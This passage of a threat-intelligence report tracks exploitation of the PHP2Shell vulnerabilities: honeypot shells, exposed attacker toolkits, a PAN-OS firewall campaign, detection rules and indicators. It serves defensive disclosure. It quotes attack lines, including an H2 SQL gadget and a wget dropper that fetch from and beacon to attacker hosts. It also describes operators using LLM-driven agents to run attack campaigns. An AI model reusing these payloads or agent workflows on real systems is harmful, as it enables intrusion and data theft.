shared exploit kits, cloned PoCs, custom heap exploits, scanners, and post-exploitation tooling across multiple hosts.\n\n-   A shared ASLR-bypass kit was byte-identical across four hosts, with lab logs confirming execution as www-data.\n\n-   Shells have been confirmed only on honeypots and sensors by watchTowr, 0x4D31, and GreyNoise. Wiz and CrowdStrike found none. On the open internet, there is still no evidence of reliable mass compromise, but php2shell has been used to root internet-facing PAN-OS firewalls, the first confirmed production compromises. \n\n-   In one capture, an operator ran php2shell against a national government, got only a crash, and then broke in with a different bug.\n\n-   A PAN-OS-focused repackaging was exposed at 130.94.67[.]235. Files including panos_rce_poc.py and prce.py show adaptation of the PHP2Shell technique for a firewall-management environment. \n\n-   Operators stage these kits against hand-picked, high-value targets: a government finance ministry, a national bank, a government e-invoicing platform, telecom, and university systems.\n\n-   One operator wrote its own heap exploit and ships a log cleaner, which is more effort than running a public PoC.\n\nPHP2Shell: The Vulnerability and Exploitation Chain \n----------------------------------------------------\n\n[PHP's own advisories](https://www.php.net/archive/2026.php#2026-10-21-5) describe CVE-2026-109618 and CVE-2026-109619 as two related memory-safety bugs in PHP core. Both are rated CVSS v4.0 9.2 and fixed in PHP 8.2.35, 8.3.36, 8.4.27, and 8.5.12.\n\n1.  CVE-2026-109618 (GHSA-w8hw-w9fx-j79w) is a use-after-free reachable when PHP's old out-of-memory path calls longjmp() to abort a request without accounting for memory that was only partially set up, so the later request-cleanup step reads or branches on invalid state.\n\n1.  CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp) is a related use-after-free where global state that should point into request memory is not reset correctly and can be read across requests after that memory is freed.\n\nA third tracking entry, [CVE-2026-115560](https://www.php.net/archive/2026.php#2026-10-23-1), was opened on October 23 after the leak with no technical detail of its own. Its only [public guidance, from cPanel](https://support.cpanel.net/hc/en-us/articles/44488655369367-PHP-Security-Release-CVE-2026-115560), is to disable __session.upload_progress__ as a stopgap, which is the same mitigation the original advisories point to.\n\n__session.upload_progress__, on by default in PHP since version 5.4, is the practical way in. During a multipart upload, it writes progress data, including an attacker-controlled key, into the session file before the request finishes initializing, which is why it sits at the center of nearly every proof of concept we pulled from open directories.\n\nThe [full chain one operator's own tooling documents](https://qideng.substack.com/p/php2shell-dissecting-phps-critical) in detail uses that entry point to corrupt the Zend memory allocator, leak the libphp base address to defeat ASLR, then forge a destructor pointer so a later free calls system(). A [publicly staged README spells out the three stages almost exactly as PHP's advisory](https://github.com/ikow/php2shell-poc/blob/main/README.md) describes the underlying bug class:\n\n1.  __Heap groom__. An out-of-bounds read leaks the Zend memory-manager chunk base.\n\n2.  __libphp leak__. A forged zend_string length exposes the destructor pointer and the libphp base, defeating ASLR.\n\n3.  Remote code execution, by forcing a call through the forged pointer.\n\nIf the target already has a local file inclusion bug, an operator can skip the heap work entirely, write PHP code into the session file through session.upload_progress, then include that file through the existing LFI. One tool we pulled calls this step __chain_a_session_lfi.py__, and its documentation is explicit that it needs nothing disabled on a stock install, only an existing include bug to reach the planted code.\n\nReliability remains the key limitation, as triggering a use-after-free does not guarantee control over subsequent memory access. The address-leak stage also depends heavily on PHP's build, memory limits, and worker model, with frequent memory exhaustion distinguishing attempted exploitation from reliably demonstrated success.\n\nPHP2Shell Exploitation in the Wild: What the Evidence Shows \n------------------------------------------------------------\n\nPublic reporting doesn't fully agree, and the split that matters is simple: who observed exploitation, and who looked and saw none.\n\n-   [0x4D31](https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md) (Adel Karimi) ran PHP 8.4.26 honeypots and logged 32 shells from [162.35.99[.]94](https://portal.hunt.io/ip/x.x.x.x) across three targets, plus 3 from [15.204.59[.]70](https://portal.hunt.io/ip/x.x.x.x), on 2026-10-24. The signal he trusted was an Apache worker spawning a shell, not an HTTP 200. He also flagged his test as a single-worker setup, which is kind to the exploit.\n\n-   [GreyNoise](https://php.events.greynoise.io/) logged 5 shells from [2.59.133[.]151](https://portal.hunt.io/ip/x.x.x.x) on 2026-10-28 and 10-29, again apache2 spawning sh. The spawned shell ran a curl to an integer-encoded version of the attacker's own IP, then sleep 5.\n\n-   [Wiz](https://www.wiz.io/blog/php2shell-exploitation-so-far) published on 2026-10-27 and took the other side. Its attempts mostly triggered memory exhaustion and failed the address leak, and it saw no end-to-end success in its own telemetry. It credited the honeypot result but called it a favorable configuration.\n\n-   [CrowdStrike](https://www.crowdstrike.com/en-us/blog/obstacles-to-weaponizing-php2shell-likely-constrain-exploitation/) reached the same conclusion on 2026-10-23: no exploitation in the wild or in its own honeypots, only testing and failed attempts, and no public exploit it judged good enough for widespread use.\n\nSo __three__ independent honeypot networks confirm the bug works in some conditions, while __two__ major vendors looked and saw nothing land. __watchTowr__ [reported](https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/) exploitation of both CVEs on its Attacker Eye honeypots on 2026-10-21, the earliest of the three, alongside the shells 0x4D31 and GreyNoise logged. __None of these honeypot results show it reliably compromising arbitrary production servers, and every vantage point in this section is a honeypot or a sensor. The confirmed production compromises are against PAN-OS, covered below.__\n\nSeveral other firms, including __Tenable__, __Sophos__, __Zscaler__, __Elastic__, and __Tanium__, published advisories and detection guidance but reported no exploitation of their own. This is the public reporting available as of October 30, not necessarily a complete record.\n\nThe earliest careful assessment said the same thing. On 2026-10-21, the day the fixes landed and before the week of alarm, Daniel Card at PwnDefend [weighed how likely mass exploitation really was](https://www.pwndefend.com/2026/10/21/how-likely-is-mass-exploitation-of-php2shell/) and called it a high-alert but not-yet-active scenario: mass denial of service and memory disclosure were the probable outcomes, while reliable RCE would stay tied to specific stacks (SAPI, memory_limit, architecture). That held for the open internet. It did not hold for uniform appliance stacks. php2shell has since been used to root internet-facing PAN-OS firewalls, the stack-specific reliable RCE Card identified as the real risk.\n\nThe three IPs behind those confirmed shells are below.\n\n### Confirmed shells on honeypots and sensors\n\n| IP | Host / ASN | Country | Reported by | Notes |\n| --- | --- | --- | --- | --- |\n| [162.35.99[.]94](https://portal.hunt.io/ip/x.x.x.x) | InterServer (AS19318) | US | 0x4D31, Wiz | 32 shells; also stages a separate Metabase/H2 RCE on :8090 |\n| [15.204.59[.]70](https://portal.hunt.io/ip/x.x.x.x) | OVH | US | 0x4D31, Wiz | 3 shells; opendir on :81 with an sh dropper and integer-IP beacon |\n| [2.59.133[.]151](https://portal.hunt.io/ip/x.x.x.x) | dataforest GmbH (AS58212) | DE | GreyNoise | 5 shells; boundaries ----lf and ----rceStock, which we do not see in our data |\n\nTo pull these up, search each IP in [AttackCapture™](https://hunt.io/features/attackcapture), or run the open-directory query from our Query Playbook:\n\n```sql\nSELECT\n  file_url,\n  file_name\nFROM\n  open_directories\nWHERE\n  ip = 'x.x.x.x'\n  OR ip = 'x.x.x.x'\n  OR ip = 'x.x.x.x'\nGROUP BY\n  file_url,\n  file_name\n```\n\nOutput example:\n\n![Figure 1](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+1.png)\n\n###### Figure 1. A HuntSQL query to find filenames exposed through open directories across three IP addresses, 162.35.99[.]94, 15.204.59[.]70, and 2.59.133[.]151.\n\nThe [query](https://portal.hunt.io/sql?sql=SELECT%0A++file_url%2C%0A++file_name%0AFROM%0A++open_directories%0AWHERE%0A++ip+%3D+%27162.35.99.94%27%0A++OR+ip+%3D+%2715.204.59.70%27%0A++OR+ip+%3D+%x.x.x.x%27%0AGROUP+BY%0A++file_url%2C%0A++file_name&run=true&page=0&size=25&sizeWasCapped=false&hl=true&ec=true&tf=30&hasExplicitTimeframe=false&tab=results) returned __107 events__ since September 29, 2026, indicating repeated activity involving __five distinct file URLs__ across the observed timeframe. The files include a SQL proof of concept, HTTP logs, and several numbered or versioned resources.\n\nOn [162.35.99[.]94](https://portal.hunt.io/ip/x.x.x.x), the open directory on :8090 is not php2shell at all. It is an H2 database RCE gadget aimed at Metabase, a different tool the same host happens to run:\n\n```sql\nCREATE ALIAS IF NOT EXISTS EXEC AS 'void run(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{\"bash\",\"-c\",cmd}); }';\nCALL EXEC('curl -s -m 5 http://162.35.99[.]94:8090/metabase-rce-139.162.86[.]33');\n```\n\n![Figure 2](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+2.jpg)\n\n###### Figure 2. The open directory on 162.35.99[.]94:8090, one of the three confirmed php2shell shell sources. The exposed files show an H2/Metabase RCE gadget (poc.sql) and an HTTP log showing days of scanning traffic from other actors hitting the same box.\n\nOn [15.204.59[.]70](https://portal.hunt.io/ip/x.x.x.x), the open directory holds the second-stage dropper and a beacon that calls home to an integer-encoded form of its own IP:\n\n```bash\n# identify, beacon, second-stage pull over wget/curl, self-contained\nwget -q -O /tmp/.s2 \"http://15.204.59[.]70:81/s2\"\n# beacon back, integer-IP http, no SNI\nwget -q -O /dev/null \"http://265042758:81/b?...\"\n```\n\n\u003Cbr>\n\n![Figure 3](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+3.jpg)\n\n###### Figure 3. Post-exploitation staging on 15.204.59[.]70:81. s2_new fingerprints the host, pulls the s2 payload, and beacons back to an integer-encoded form of its own IP with no SNI, one of the confirmed php2shell shell sources, caught in the act of staging its next stage.\n\nMapping the PHP2Shell Exploit Infrastructure \n---------------------------------------------\n\nThe public reports show where shells landed. They do not show the tooling behind them, and that is what our open-directory data maps next. The hunting methodology began with three confirmed IPs and publicly reported file artifacts as initial indicators. __AttackCapture™ Code Search__ was used to search indexed open-directory file contents for key strings, including __session.upload_progress__ and the relevant CVE identifiers, identifying [616 matching files](https://portal.hunt.io/attackcapture/code-search?q=%22%5C%22session.upload_progress%5C%22%22&run=true) as of October 30.\n\n![Figure 4](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+4.png)\n\n###### Figure 4. AttackCapture™ Code Search showing 616 matches for the 'session.upload_progress' string search\n\n__HuntSQL's open_directories__ table was used to validate timestamps and host activity, while IP enrichment provided ASN, hosting provider, and country details for infrastructure attribution.\n\n__Note__: An exposed toolkit on an open directory proves the tooling is present, not that any given target was hit.\n\n| Host:port | Role | Key files | New here |\n| --- | --- | --- | --- |\n| [208.115.245[.]98](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8088) / .99 / .102 :8088 | Toolkit staging cluster, cloned PoCs plus a running copy | php2shell_dl/ (ikow, mnk-works, murrez, zr0n), p2s_run/poc.py 535b9e29 | Yes |\n| [185.242.106[.]140:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000) | Operational toolkit | vcript.py, sc.py heap RCE, scanners, vcsu7 log cleaner | Yes |\n| [45.39.190[.]176:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000) | Dev/build box plus a Moodle workspace | chain_a_session_lfi.py (= vcript.py), compiled PHP 8.4.15 | Yes |\n| 130.94.67[.]235 ([:80](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x), [:8080](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8080)) | Same bug repackaged for PAN-OS | panos_rce_poc.py / prce.py 1c93ea48 | Yes |\n| [45.83.180[.]113:19001](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:19001) | php2shell IoC/kit tracker | php2shell_watch_report.txt | Yes |\n| [15.204.59[.]70:81](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:81) | Post-exploitation staging | s2 dropper, s2_new integer-IP beacon | Contents new |\n| 85.121.179[.]129 ([:53](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:53), [:80](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:80), [:443](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:443)) | Exploit-development host | php2shell-bypass-aslr-exp tree; cmd*.log info-leak | Yes |\n| [34.146.20[.]31](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8181) / [38.60.136[.]217](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8111) / [96.126.130[.]81](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:9999) / [101.133.233[.]159](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8080) | Shared 9bie kit, lab RCE to www-data | php2shell-bypass-aslr-exp (byte-identical), poc_109618.py | Yes |\n| [130.12.180[.]89:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000) | php2shell attempted, failed; pivoted to a web-framework RCE | p2s_run.py, php2shell_*.log (RCE unreachable) | Yes |\n| [198.41.83[.]165:8000 ](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000)/ [198.41.83[.]174:8000](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000) | Shared operator, php2shell plus password-cracking and scanning | p2s_exp.py, identical SHA-256 8e655357b2... on both hosts, alongside hydra and nuclei | Yes |\n| [18.136.195[.]202:8888](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8888) | Public PoC with a bundled ModSecurity detection rule | cve-2026-109618-php2shell/README.md, modsecurity-php2shell.conf | Yes |\n| [95.41.54[.]130:80](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:80) | Operator workstation running an AI offensive framework that tests php2shell among other bugs | ARTEX-main/ transcripts, alongside evilginx2 and cloud-attack tooling unrelated to php2shell | Yes |\n\nTo sum up, we have mapped some of the open directories in multiple categories.\n\n![Figure 5](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+5.png)\n\n###### Figure 5. The php2shell staging servers we captured, grouped by operator. The same 9bie ASLR-bypass kit is byte-identical across four of them, lab-proven to reach www-data. This shared kit has not been observed landing on a live victim; the confirmed PAN-OS compromises trace to a separate operator.\n\nThe kits behind these files group into a few distinct operators.\n\n### Inside the Operators' Exploit Toolkits \n\nOur analysis found multiple groups running the same bug through different kits. One pattern, a single kit shared across many more operators, is covered separately below.\n\nWe have found a cluster of three open directories hosted at [208.115.245[.]98](https://portal.hunt.io/ip/x.x.x.x), [208.115.245[.]99](https://portal.hunt.io/ip/x.x.x.x), and [208.115.245[.]102](https://portal.hunt.io/ip/x.x.x.x), on port 8088 with the same layout. Each serves a php2shell_dl/ folder of cloned public repos and a live copy under p2s_run/. The running poc.py is identical on all three, which is what ties them together. \n\nOne cloned README states the target plainly: an automated php2shell exploit for CVE-2026-109618 and CVE-2026-109619, unauthenticated RCE in the PHP engine through session.upload_progress heap corruption.\n\n![Figure 6](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+6.png)\n\n###### Figure 6. README for the 'php2shell' exploit (CVE-2026-109618/109619) that contains vulnerability explanation, exploitation chain, usage examples, offset-resolution methods, mitigation guidance, and references to related GitHub projects and research.\n\nThe second example pairs two open directories hosted at [185.242.106[.]140](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000) and [45.39.190[.]176](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000). Our analysis found two exploits with a byte-identical core: __vcript.py__ on one and __chain_a_session_lfi.py__ on the other, and both import the same helper whose docstring reads, \"Shared utilities for php2shell exploits.\"\n\n![Figure 7](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+7.jpg)\n\n###### Figure 7. Proof-of-concept exploit for CVE-2026-109618/109619; crafts multipart requests, injects PHP into session upload progress, and triggers LFI for pre-auth RCE.\n\nThis operator runs __two__ techniques in parallel: the __session-injection LFI chain__ and a __hand-written heap exploit__ with hardcoded offsets for a specific PHP 8.4.26 Apache build. It also ships a utmp and wtmp log cleaner, which tells us it expects interactive shells on hosts it actually hits. Output comes back in the HTTP response directly, so there is no separate command-and-control channel to find.\n\n### The exception that landed: Palo Alto PAN-OS firewalls rooted\n\nThis is the most important finding in this report, and it is not one more operator in the list above. On the open internet php2shell mostly dies in memory exhaustion. Palo Alto PAN-OS management is the exception, because it runs one uniform PHP 8.0.30 build across every unpatched box, which turns the unreliable heap chain into a calibratable, repeatable exploit. \n\nWe identified an exposed open directory at [130.94.67[.]235](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8080) hosting a PAN-OS-focused adaptation of the PHP2Shell exploit chain. The directory contains two relevant files, panos_rce_poc.py and prce.py, indicating that the operator had adapted the PHP memory-corruption vulnerability for a different attack surface: Palo Alto Networks PAN-OS firewall management interfaces.\n\n![Figure 8](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+8.png)\n\n###### Figure 8. Exposed open directory at 130.94.67[.]235 hosting a PAN-OS-focused adaptation of the PHP2Shell exploit chain\n\nThis is the first confirmed real-world php2shell compromise we can point to, and subsequent research by Dream Research [documented](https://dreamgroup.com/blog/chained-php2shell-exploit-roots-25-servers) an active exploitation campaign using a custom PHP2Shell implementation specifically developed and tailored for PAN-OS.\n\nIn its investigation, published on October 26 and updated October 29, Dream Research detailed how an attacker combined __CVE-2026-109618__ and __CVE-2026-109619 (PHP2Shell)__ with __[CVE-2026-46300 (Fragnesia)](https://nvd.nist.gov/vuln/detail/cve-2026-46300)__, a Linux kernel privilege-escalation vulnerability. The first exploit provided unauthenticated remote code execution through PHP's session.upload_progress mechanism on the PAN-OS management web server (appweb). \n\n![Figure 9](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+9.png)\n\n###### Figure 9. Proof-of-concept exploit targeting PAN-OS PHP session.upload_progress vulnerability. Crafts large multipart/form-data requests to leak addresses and forge structures to invoke system() for unauthenticated RCE. \n\nThe attacker then used Fragnesia to escalate privileges from the web-server execution context to root. The PHP2Shell implementation was a custom, non-public exploit rather than a copy of an existing public proof of concept. It was specifically adapted to PAN-OS and used version-dependent memory offsets and carefully calibrated heap layouts.\n\nThe attacker identified approximately 19,000 internet-facing PAN-OS firewalls, fingerprinted around 5,000 responsive devices, and narrowed the list to 240 targets matching the required geographic and software-version profiles. The automated exploitation campaign successfully rooted 24 firewalls initially. The attacker subsequently prioritized systems associated with a US government-affiliated environment, establishing a persistent reverse SSH tunnel into its internal network and exploiting an additional internal firewall management server. This brought the total to 25 compromised servers.\n\nThe operator did not run this by hand. The same directory held aiscan, an autonomous reconnaissance and scanning framework wired to two large language models, DeepSeek as its primary driver and Kimi for vision tasks such as reading captured screenshots, with target discovery handled by the FOFA search engine rather than a model. Claude Code was also present on the host. \n\n![Figure 10](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+10.png)\n\n###### Figure 10. AttackCapture™ showing the operator’s aiscan.yaml, API key redacted. The provider fields (openai, anthropic) and the “Kimi (Anthropic)” note are API-compatibility labels, not the vendors; the base_url and model lines name the real services, DeepSeek and Kimi.\n\nThe operator's own instructions to the agent, recovered from its session logs, are written in Chinese. What the AI layer does here is orchestrate the campaign: it drives discovery, triage, and the scan-and-verify loop behind the target selection that pared roughly 19,000 firewalls down to a few hundred worth attacking. \n\nThe exploit itself, the php2shell and Fragnesia chain with its per-build memory offsets, is hand-calibrated work, and nothing in the capture shows a model writing it. The shift worth noting is not that AI built the exploit, but that it ran the operation around it, turning a hand-made chain into an automated, repeatable campaign.\n\nGiven its significance, we are covering this PAN-OS campaign in a dedicated analysis of its own.\n\n### More operators and public PoCs\n\nAnother pair hosted at [198.41.83[.]165](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000) and [198.41.83[.]174](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000) on port 8000, hosted on the same network (VINAKOM COMMUNICATIONS, AS36327, US), runs an identical __php2shell exploit script__ (p2s_exp.py) alongside Hydra for password attacks and Nuclei for broader scanning. \n\nOne of the two hosts also exposed a leaked __Google Gemini API__ key in plaintext, picked up by our automated secret scanning. The exploit script itself is a careful, documented implementation of the __session-poisoning-plus-LFI chain__, built to work against a stock PHP install with session.upload_progress on, cleanup on, and no server-side setting disabled, as long as an existing local file inclusion is available to trigger the include.\n\n![Figure 11](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+11.jpg)\n\n###### Figure 11. Python exploit for CVE-2026-109618 / CVE-2026-109619. Crafts multipart POSTs to poison PHP session files via upload_progress and triggers inclusion via LFI to achieve RCE. Uses raw sockets, threading, timing/drip technique, and configurable session paths/prefix/suffix.\n\nA separate host, [18.136.195[.]202](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8888) on port 8888, hosted on AWS in Singapore, stages a cloned proof of concept whose README documents the same three-stage heap leak, libphp leak, and forged-destructor chain described above, matched almost word for word against the official GHSA advisory text for both CVEs.\n\n![Figure 12](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+12.jpg)\n\n###### Figure 12. Multiple README files documenting security research and proof-of-concept exploits, including PHP2Shell, Node2Shell, and container-escape vulnerabilities.\n\n__Note__: On names: the handles in the code, ikow, LordX, and Tr0y, are the authors of the public PoCs and the reused log cleaner. They are not the operators. Treat them as tool lineage, not attribution.\n\n### An exploit still in development, with the hard part working\n\nOne more capture deserves separating from the operator clusters above. [85.121.179[.]129](https://portal.hunt.io/ip/x.x.x.x) (AS48753, AlexHost SRL, Chisinau, Moldova) is not a staging box running someone else's kit. It is an exploit-development tree, 4,768 files and about 620 MB, served open across ports 53, 80, and 443 and updated as recently as 2026-10-28 03:37 UTC. We first captured it on 2026-10-26.\n\nAfter the analysis, we found the working notes of someone building the heap exploit, such as chunk-sweep and heap-grooming scripts, out-of-bounds probes, and dozens of timestamped run logs. Several of the research notes inside, written mostly in __Chinese__, work through PHP's own RINIT initialization order in detail, tracing exactly where in the request lifecycle the __session.upload_progress__ callback runs relative to PHP's normal startup, and using that timing to explain why some chains succeed and others only crash the worker.\n\nOne proof-of-concept script on the host, __sup_poc.py__, documents a pure cross-request trigger for the bug with no application-level session code required at all, sending one request that forces an out-of-memory bailout after session initialization, then a second request that reads back the resulting state.\n\n![Figure 13](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+13.jpg)\n\n###### Figure 13. Proof-of-concept exploit for CVE-2026-109618. Crafts multipart POSTs (Request A with file + huge field, Request B without file) to trigger php_session_rfc1867 cleanup and dereference stale session vars; used to reproduce triggerable memory bug/OOM conditions.\n\nIn the operator's own cmd5.log, that step is working:\n\n```bash\nleak 819208 ptrs 8762\nB2 1 1.4s vl=384 n1=2000 n2=1990 name_len=10 rc=1 ptr=0x7fffa42f8000 ht=384 resp=229781 status='HTTP/1.1 200 OK'\n```\n\nThe ten-character name_len is the same multipart-boundary tell we flag under detection. The HTTP 200 carries leaked heap pointers back to the operator, and the log resolves a base address from them. This is the first time in our own data we have caught the address-leak primitive succeeding against a real target instead of dying in memory exhaustion.\n\n__Note__: The logs we reviewed reach a working leak, not confirmed command execution on a live production host, and the target it is aimed at is not one we can confirm from the capture.\n\n### The same kit, many operators, deliberate targets\n\nThe Moldova workbench is not a one-off. The same ASLR-bypass tree, byte-identical by SHA-256, turns up across __four__ more open directories captured between October 22 and October 27, [34.146.20[.]31](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8181), [38.60.136[.]217](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8111), [96.126.130[.]81](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:9999), and [101.133.233[.]159](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8080). The exploit scripts, the leak tool (tools/aslr_run.py), the lab configurations, and even the debugger logs match from host to host. This is one kit shared between operators, not several people independently building the same thing.\n\n![Figure 14](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+14.jpg)\n\n###### Figure 14. Contacts local HTTP endpoints to parse heap/libc leaks, crafts parameters for dynamic exploit, checks /tmp/x for proof output.\n\nOn those four hosts, the kit works in a lab. The operators' own logs record a shell running as the web server user against vulnerable PHP builds, 8.2.34 and 8.4.26, with the address-leak step solved, the same result read on the Moldova host. One log line states the proof outright: __uid=33(www-data)__ __gid=33(www-data)__ __groups=33(www-data)__. The capability is real, and it is spreading between operators who are not in the same group.\n\n```bash\ntools/aslr_run.py  sha256 5e99d6023dce...  identical on 34.146.20[.]31 - 38.60.136[.]217 - 101.133.233[.]159\nfrom the kit's own notes:  PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nThe staging directories hold hand-picked targets: a government finance ministry in Central Africa, a national bank in a European microstate, a government e-invoicing platform in East Asia, a commercial and telecom group in Southeast Asia, and university and procurement systems in the Caucasus. \n\n![Figure 15](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+15.png)\n\n###### Figure 15. Where the operators aimed php2shell, by sector and region. These staged targets were not confirmed compromised by php2shell. Separately, php2shell was used to root internet-facing PAN-OS firewalls.\n\nOne capture shows what happens when the kit meets a target like that. On [130.12.180[.]89](https://portal.hunt.io/attackcapture/filemanager?host=http://x.x.x.x:8000), an operator ran the full __php2shell chain__ (p2s_run.py) against a __national government in Eastern Europe__, and it failed. The logs confirm that RCE was unsuccessful in the target configuration, with attempts resulting only in crashes and memory exhaustion. Session files remained outside the webroot, preventing execution.\n\n![Figure 16](https://public-hunt-static-blog-assets.s3.us-east-1.amazonaws.com/10-2026/PHP2Shell+One+Week+Later+-+figure+16.jpg)\n\n###### Figure 16. Exploit script targeting php2shell CVE. Crafts large multipart requests to trigger OOM, uploads a PHP payload into a session filename, then probes possible sess_* paths to execute commands.\n\nThe operator __ultimately gained access__ by exploiting a separate server-side vulnerability, confirming that PHP2Shell was attempted against a __government target__ but did not succeed.\n\n```bash\nthe operator's own run log, target redacted:\ncount=1500  →  http-5xx\nprogress-upload: ok\n[shell] не подтверждён   (sess_* вне webroot / не исполняется)\n[СВОДКА] target=https://\u003Cgov>/  OOM=ДА   shell=НЕТ\n```\n\nOne of the operators we captured left an __AI assistant's session log__ in an open directory. The transcript, in __Chinese__, works through the php2shell advisory and the public exploit, and ties into an AI-driven offensive workflow we have covered before. A small but concrete marker of where this is heading: the exploit research itself handed to an agent. Set the open directories beside the public reporting and the PAN-OS campaign, and the assessment follows.\n\nAssessment: PHP2Shell Has Moved Beyond Proofs of Concept\n--------------------------------------------------------\n\nPHP2Shell's exploitation picture has changed materially. Our initial investigation documented a growing ecosystem of proof-of-concept exploits, shared toolkits, exploit-development environments, and operators attempting to turn PHP memory-corruption vulnerabilities into reliable remote code execution. At that stage, successful compromise of production systems remained difficult to establish from our own observations.\n\nSubsequent reporting has raised the level of concern. Dream Research documented a campaign in which attackers chained PHP2Shell with the Fragnesia kernel privilege-escalation vulnerability to obtain root access on 25 servers. Unit 42 later reported independently verifying the same attacker's tooling and the reported results. These findings establish that the threat extends beyond experimental tooling and isolated honeypot observations.\n\nFor defenders, the priority is no longer simply to anticipate whether PHP2Shell might be weaponized. Successful exploitation has been reported, and chaining PHP2Shell with a privilege-escalation vulnerability demonstrates how an initial foothold can become a deeper infrastructure compromise. The recommendations that follow address both the PHP exploit and the escalation path behind it.\n\nRecommendations\n\n-   Patch to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12 depending on branch, closing CVE-2026-109618 and CVE-2026-109619 outright.\n\n-   Where patching has to wait, set session.upload_progress.enabled = 0 in php.ini, the same stopgap cPanel shipped for CVE-2026-115560.\n\n-   Add a WAF or reverse proxy rule flagging multipart POST requests with no User-Agent, a boundary under roughly twelve characters, and an oversized PHPSESSID cookie.\n\n-   Add a host rule, auditd or EDR, alerting whenever an apache2 or php-fpm worker process spawns /bin/sh.\n\n-   Add an egress rule flagging Apache or php-fpm making outbound connections to a raw IP address with no SNI.\n\n-   Add a SIEM correlation rule for more than three multipart POSTs to the same PHP endpoint from one source within 60 seconds.\n\n-   Run a YARA rule for the kit's own markers, attacksessionid0001, __PHP2SHELL_PROBE, and php2shell-scan, across web server temp and upload directories.\n\nIndicators of Compromise \n-------------------------\n\nThe indicators below are defanged. They cover the confirmed-shell sources, the staging and exploit-development hosts, and the file hashes behind the shared kit. The queries to reproduce them are in the detection section above.\n\n| IP / host | ASN | Hosting provider | Country | Role |\n| --- | --- | --- | --- | --- |\n| 162.35.99[.]94 | AS19318 | Interserver | US | Confirmed source, honeypot shells |\n| 15.204.59[.]70 | AS16276 | OVH | US | Confirmed source, honeypot shells |\n| 2.59.133[.]151 | AS58212 | dataforest GmbH | DE | Confirmed source, GreyNoise |\n| 208.115.245[.]98:8088 | AS46475 | Limestone Networks | US | Staging cluster |\n| 208.115.245[.]99:8088 | AS46475 | Limestone Networks | US | Staging cluster |\n| 208.115.245[.]102:8088 | AS46475 | Limestone Networks | US | Staging cluster |\n| 185.242.106[.]140:8000 | AS42532 | SIA VEESP | LV | Operational toolkit |\n| 45.39.190[.]176:8000 | AS211273 | Cloud Software FZCO | HK | Dev/build box, Moodle victim |\n| 130.94.67[.]235:80,8080 | AS154177 | Light Node Limited | JP | PAN-OS repackage |\n| 45.83.180[.]113:19001 | AS62005 | BlueVPS | EE | IoC/kit tracker |\n| 15.204.59[.]70:81 | AS16276 | OVH | US | Post-exploitation staging |\n| 162.35.99[.]94:8090 | AS19318 | Interserver | US | Metabase/H2, separate exploit |\n| 85.121.179[.]129 | AS48753 | AlexHost SRL | MD | 